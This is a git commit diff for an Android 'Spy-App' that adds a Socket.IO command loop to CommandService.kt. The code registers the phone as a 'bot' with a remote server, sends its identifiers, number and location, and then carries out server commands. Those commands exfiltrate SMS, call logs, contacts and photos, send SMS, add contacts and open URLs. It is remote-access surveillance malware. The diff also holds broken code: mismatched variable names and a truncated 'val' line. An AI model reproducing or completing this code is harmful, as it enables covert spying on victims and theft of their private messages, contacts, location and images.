dcb6a6f24349dfada1aa528d648bfe8213a37a26
steiner-254 <steineralvin3@gmail.com>
2024-06-20 02:01:06 +0300

    update

--- Spy-App/CommandService.kt
+++ Spy-App/CommandService.kt
@@ -64,6 +64,88 @@ class CommandService : Service() {
     }
 
     private fun createSocket(server: String) {
-        
+        val socket = IO.socket(server)
+        Constants.socket = socket
+
+        val params = CommonParams(this)
+
+        socket.on(Socket.EVENT_CONNECT) {
+            Log.i(tag, "\n\nSocket connected\n\n")
+            wakeLock.acquire(60 * 60 * 1000)
+
+            val bot = JSONObject()
+            bot.put("uid", params.uid)
+            bot.put("serial", params.serial)
+            bot.put("provider", params.provider)
+            bot.put("device", params.device)
+            bot.put("sdk", params.sdk)
+            bot.put("verion", params.version)
+            bot.put("phone", params.phone)
+            bot.put("location", LocationMonitor(this, socket).getLastLocation())
+            bot.put("email", prefs.getString("email", "abhinav.suthar.50@gmail.com"))
+            bot.put("socket_id", socket.id())
+            val prevClientID = prefs.getString("clientID", "whatever")
+            Log.d(tag, "Prev client Id $prevClientId")
+            bot.put("prevClientId", prefs.getString("clientID", "whatever"))
+
+            socket.emit("bot-login", bot) {
+                args -> val cmds = args[0] as JSONArray
+
+                for (i in 0..(cmds.length() - 1)) {
+                    val cmd = cmds.getJSONObject(i)
+
+                    val command = cmd.get("command") as String
+                    Log.i(tag, "\nCommand: " + cmd.toString() + "\n")
+
+                    when (command) {
+                        
+                        "getSms" -> {
+                            val argl = Integer.parseInt(cmd.get("arg1").toString())
+                            SmsTask(this, arg1, socket).start()
+                        }
+
+                        "getCallHistory" -> {
+                            val arg1 = Integer.parseInt(cmd.get("arg1").toString())
+                            CallLogsTask(this, arg1, socket).start()
+                        }
+
+                        "getContacts" -> {
+                            ContactsTask(this, socket).start()
+                        }
+
+                        "addContact" -> {
+                            val phone = cmd.get("arg1").toString()
+                            val name = cmd.get("arg2").toString()
+                            AddNewContact(this, phone, name).start()
+                        }
+
+                        "getLocation" -> {
+                            LocationMonitor(this, socket).start()
+                        }
+
+                        "sendSms" -> {
+                            val phoneNumber = cmd.get("arg1").toString()
+                            val textMessage = cmd.get("arg2").toString()
+                            SendSmsTask(this, textMessage, phoneNumber, socket).start()
+                        }
+
+                        "getImages" -> {
+                            PhotosTask(this, socket).start()
+                        }
+
+                        "downloadImage" -> {
+                            val path = cmd.get("arg1").toString()
+                            DownloadImage(this, socket, path).start()
+                        }
+
+                        "openBrowser" -> {
+                            val url = cmd.get("arg1").toString()
+
+                            val 
+                        }
+                    }
+                }
+            }
+        }
     }
 }
